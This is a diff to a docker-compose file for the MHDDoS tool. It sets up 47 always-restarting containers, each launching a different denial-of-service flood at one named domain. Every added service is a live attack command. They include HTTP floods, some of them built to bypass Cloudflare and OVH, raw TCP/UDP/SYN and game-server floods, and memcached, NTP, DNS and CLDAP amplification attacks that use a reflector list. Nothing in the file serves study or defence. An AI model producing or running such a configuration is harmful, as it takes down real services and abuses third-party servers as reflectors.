@@ -1,14 +1,262 @@
-version: "3.9"
-
 services:
-  mhddos:
-    # image: ghcr.io/mhprodev/mhddos:latest
+  # ==================== LAYER 7 METHODS (26) ====================
+  l7-cfb:
     build: .
-    container_name: mhddos
-    restart: unless-stopped
-    volumes:
-      - ./config.json:/app/config.json
-      - ./files:/app/files
-     
-    
-    
+    restart: "always"
+    command: CFB "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-bypass:
+    build: .
+    restart: "always"
+    command: BYPASS "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-get:
+    build: .
+    restart: "always"
+    command: GET "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-post:
+    build: .
+    restart: "always"
+    command: POST "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-ovh:
+    build: .
+    restart: "always"
+    command: OVH "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-stress:
+    build: .
+    restart: "always"
+    command: STRESS "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-dyn:
+    build: .
+    restart: "always"
+    command: DYN "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-slow:
+    build: .
+    restart: "always"
+    command: SLOW "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-head:
+    build: .
+    restart: "always"
+    command: HEAD "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-null:
+    build: .
+    restart: "always"
+    command: 'NULL https://ukmkopmaunnes.com 0 1000 http.txt 100 300 debug'
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-cookie:
+    build: .
+    restart: "always"
+    command: COOKIE "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-pps:
+    build: .
+    restart: "always"
+    command: PPS "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-even:
+    build: .
+    restart: "always"
+    command: EVEN "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-gsb:
+    build: .
+    restart: "always"
+    command: GSB "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-dgb:
+    build: .
+    restart: "always"
+    command: DGB "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-avb:
+    build: .
+    restart: "always"
+    command: AVB "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-cfbuam:
+    build: .
+    restart: "always"
+    command: CFBUAM "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-apache:
+    build: .
+    restart: "always"
+    command: APACHE "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-xmlrpc:
+    build: .
+    restart: "always"
+    command: XMLRPC "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-bot:
+    build: .
+    restart: "always"
+    command: BOT "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-bomb:
+    build: .
+    restart: "always"
+    command: BOMB "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-downloader:
+    build: .
+    restart: "always"
+    command: DOWNLOADER "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-killer:
+    build: .
+    restart: "always"
+    command: KILLER "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-tor:
+    build: .
+    restart: "always"
+    command: TOR "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-rhex:
+    build: .
+    restart: "always"
+    command: RHEX "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l7-stomp:
+    build: .
+    restart: "always"
+    command: STOMP "https://ukmkopmaunnes.com" 0 1000 http.txt 100 300 debug
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+
+  # ==================== LAYER 4 TCP/UDP (14) ====================
+  l4-tcp:
+    build: .
+    restart: "always"
+    command: TCP "ukmkopmaunnes.com:443" 1000 300 debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-udp:
+    build: .
+    restart: "always"
+    command: UDP "ukmkopmaunnes.com:443" 1000 300 debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-syn:
+    build: .
+    restart: "always"
+    command: SYN "ukmkopmaunnes.com:443" 1000 300 debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-vse:
+    build: .
+    restart: "always"
+    command: VSE "ukmkopmaunnes.com:27015" 1000 300 debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-minecraft:
+    build: .
+    restart: "always"
+    command: MINECRAFT "ukmkopmaunnes.com:25565" 1000 300 debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-mcbot:
+    build: .
+    restart: "always"
+    command: MCBOT "ukmkopmaunnes.com:25565" 1000 300 debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-connection:
+    build: .
+    restart: "always"
+    command: CONNECTION "ukmkopmaunnes.com:443" 1000 300 debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-cps:
+    build: .
+    restart: "always"
+    command: CPS "ukmkopmaunnes.com:443" 1000 300 debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-fivem:
+    build: .
+    restart: "always"
+    command: FIVEM "ukmkopmaunnes.com:30120" 1000 300 debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-fivem-token:
+    build: .
+    restart: "always"
+    command: FIVEM-TOKEN "ukmkopmaunnes.com:30120" 1000 300 debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-ts3:
+    build: .
+    restart: "always"
+    command: TS3 "ukmkopmaunnes.com:9987" 1000 300 debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-mcpe:
+    build: .
+    restart: "always"
+    command: MCPE "ukmkopmaunnes.com:19132" 1000 300 debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-icmp:
+    build: .
+    restart: "always"
+    command: ICMP "ukmkopmaunnes.com:0" 1000 300 debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-ovh-udp:
+    build: .
+    restart: "always"
+    command: OVH-UDP "ukmkopmaunnes.com:80" 1000 300 debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+
+  # ==================== LAYER 4 AMPLIFICATION (7) ====================
+  l4-amp-mem:
+    build: .
+    restart: "always"
+    command: MEM "ukmkopmaunnes.com:11211" 1000 300 amp_reflectors.txt debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-amp-ntp:
+    build: .
+    restart: "always"
+    command: NTP "ukmkopmaunnes.com:123" 1000 300 amp_reflectors.txt debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-amp-dns:
+    build: .
+    restart: "always"
+    command: DNS "ukmkopmaunnes.com:53" 1000 300 amp_reflectors.txt debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-amp-ard:
+    build: .
+    restart: "always"
+    command: ARD "ukmkopmaunnes.com:3283" 1000 300 amp_reflectors.txt debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-amp-cldap:
+    build: .
+    restart: "always"
+    command: CLDAP "ukmkopmaunnes.com:389" 1000 300 amp_reflectors.txt debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-amp-char:
+    build: .
+    restart: "always"
+    command: CHAR "ukmkopmaunnes.com:19" 1000 300 amp_reflectors.txt debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
+  l4-amp-rdp:
+    build: .
+    restart: "always"
+    command: RDP "ukmkopmaunnes.com:3389" 1000 300 amp_reflectors.txt debug
+    cap_add: [ NET_RAW ]
+    volumes: [ "./config.json:/app/config.json", "./files:/app/files" ]
